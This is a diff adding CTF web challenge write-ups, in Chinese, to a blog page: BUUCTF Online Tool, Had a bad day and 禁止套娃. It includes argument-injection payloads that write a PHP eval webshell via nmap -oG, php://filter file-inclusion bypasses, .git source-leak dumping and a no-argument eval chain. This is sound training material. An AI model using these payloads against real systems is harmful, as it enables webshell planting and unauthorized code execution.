@@ -47,8 +47,10 @@
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/148.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/150.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/151.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/373.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/374.png?raw=true">
 <meta property="article:published_time" content="2023-05-02T02:47:30.000Z">
-<meta property="article:modified_time" content="2023-05-02T04:19:00.067Z">
+<meta property="article:modified_time" content="2023-05-02T06:39:00.729Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/75.png?raw=true">
@@ -184,6 +186,9 @@
 <li><a href="#bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</a></li>
 <li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84phpweb">[网鼎杯 2020 朱雀组] phpweb</a></li>
 <li><a href="#buuctf-2018online-tool">[BUUCTF 2018]Online Tool</a></li>
+<li><a href="#bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day</a></li>
+<li><a href="#gxyctf2019%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">[GXYCTF2019] 禁止套娃</a></li>
+<li><a href="#bjdctf2020zjctf%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4">[BJDCTF2020] ZJCTF，不过如此</a></li>
 </ul>
 <!-- tocstop -->
 <span id="more"></span>  
@@ -1022,7 +1027,7 @@ unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php<br>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s2YmFmODM3ZC1hZjhiLTQyOGMtOTUwMi1lNGU2ODA3NjY0MjV9IjsNCmV4aXQoMCk7DQo=</span><br></pre></td></tr></table></figure>
 <p>base64 解码</p>
 <h2><span id="roarctf-2019easy-java"> [RoarCTF 2019]Easy Java</span></h2>
-<p><a target="_blank" rel="noopener" href="https://github.com/my011215/my011215.github.io/blob/main/image/373.png?raw=true">https://github.com/my011215/my011215.github.io/blob/main/image/373.png?raw=true</a></p>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/373.png?raw=true" alt></p>
 <ol>
 <li>反编译得到源码<br>
  WEB-INF/web.xml 文件信息泄露，可以运用在线 Java 反编译得到源码<br>
@@ -1095,6 +1100,85 @@ func=unserialize&amp;p=O:4:“Test”:2:{s:1:“p”;s:2:“ls”;s:4:“func”
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=readfile&amp;p=/tmp/flagoefiu4r93</span><br></pre></td></tr></table></figure>
 <p>得到 flag</p>
 <h2><span id="buuctf-2018online-tool"> [BUUCTF 2018]Online Tool</span></h2>
+<ol>
+<li>php 代码审计</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>REMOTE_ADDR 和 HTTP_X_FORWARDED_FOR 都是和 IP 有关的内容，应该是获取相关 IP<br>
+get 接收 host 参数进行单引号转义拼接 escapeshellarg () 和转义 escapeshellcmd () 操作，最后执行 nmap 命令</p>
+<ol start="2">
+<li>漏洞利用<br>
+ escapeshellarg 的作用是把字符串转码为可以在 shell 命令里使用的参数，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>
+scapeshellcmd () 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，反斜线（\）会在以下字符之前插入： <code>&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br></pre></td></tr></table></figure>
+<p>这个代码的逻辑顺序会导致<br>
+绕过引号，从而执行命令</p>
+<ol start="3">
+<li>webshell<br>
+nmap 命令中 有一个参数 - oG 可以实现将命令和结果写到文件</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;1&quot;];?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=\&#x27; &lt;?php @eval($_POST[&quot;1&quot;];?&gt; -oG 1.php \&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;&#x27;\&#x27;&#x27; &lt;?php @eval($_POST[&quot;1&quot;];?&gt; -oG 1.php &#x27;\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;&#x27;\\&#x27;&#x27; \&lt;\?php @eval($_POST\[&quot;1&quot;\]\;\?\&gt; -oG 1.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=\ &lt;?php @eval($_POST[&quot;1&quot;];?&gt; -oG 1.php \\</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>蚁剑连接后门<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/374.png?raw=true" alt><br>
+<a target="_blank" rel="noopener" href="http://e4354b5c-cacc-40bd-b6c6-648a95cbf1c6.node4.buuoj.cn:81/17cace8e02640f8f3af0fb38005c3b0e/1.php"> http://e4354b5c-cacc-40bd-b6c6-648a95cbf1c6.node4.buuoj.cn:81/17cace8e02640f8f3af0fb38005c3b0e/1.php</a><br>
+ 找到 flag 文件即可得到 flag</li>
+</ol>
+<h2><span id="bsidescf-2020had-a-bad-day"> [BSidesCF 2020]Had a bad day</span></h2>
+<ol>
+<li>发现只有一个参数可以操作，并且该参数只能传递两个数值</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d3d9ce33-6d8c-4906-b14a-c149e86c709d.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+<p>读取 index.php 文件试一试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure>
+<p>看着报错信息应该是 php 多了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d3d9ce33-6d8c-4906-b14a-c149e86c709d.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
+<p>base64 解码后，得到一段 php 代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">				$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">				if(isset($file))</span><br><span class="line">				&#123;</span><br><span class="line">					if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">						include ($file . &#x27;.php&#x27;);</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				?&gt;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>php 代码审计<br>
+ strpos () 函数查找字符串在另一字符串中第一次出现的位置。<br>
+所以和上面猜想一致，参数值必须得有 woofers 或者 meowers<br>
+ 查看资料说 php 伪协议可以套协议<br>
+那就如下构造读取 flag.php 试一试</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category=php://filter/convert.base64-encode/woofers/resource=flag</span><br></pre></td></tr></table></figure>
+<p>base64 解码即可得到 flag</p>
+<h2><span id="gxyctf2019-禁止套娃"> [GXYCTF2019] 禁止套娃</span></h2>
+<ol>
+<li>
+<p>.git 信息泄露<br>
+查阅该文章得知开发者不慎上传.git 文件会导致源码泄露<br>
+原理大概也就是会存留一些 hash 后的 id 可以套娃寻找，这也验证了该题的题目，禁止套娃<br>
+ ps：该文章话糙理不糙<br>
+<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/267597.html"> https://www.freebuf.com/articles/web/267597.html</a></p>
+</li>
+<li>
+<p>使用工具 GitHack 获取泄露源码文件</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://0ddab4a0-a87a-460f-9846-6560a649bad3.node4.buuoj.cn:81/.git/</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>php 代码审计</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>过滤了一些伪协议<br>
+？R 递归校验，进行函数无参构造检验<br>
+屏蔽一些关键字，使用的一些函数就不能含有上述关键字</p>
+<ol start="2">
+<li>函数构造</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<p>得到 flag.php 在数组到倒数第二位，所以我们只需要读取倒数第二个文件即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+<p>逆序的下一个就是倒数第二个<br>
+看到还有博主使用随机读取，这样的话得随机几次，看运气  、</p>
+<h2><span id="bjdctf2020-zjctf不过如此"> [BJDCTF2020] ZJCTF，不过如此</span></h2>
 
       
     </div>
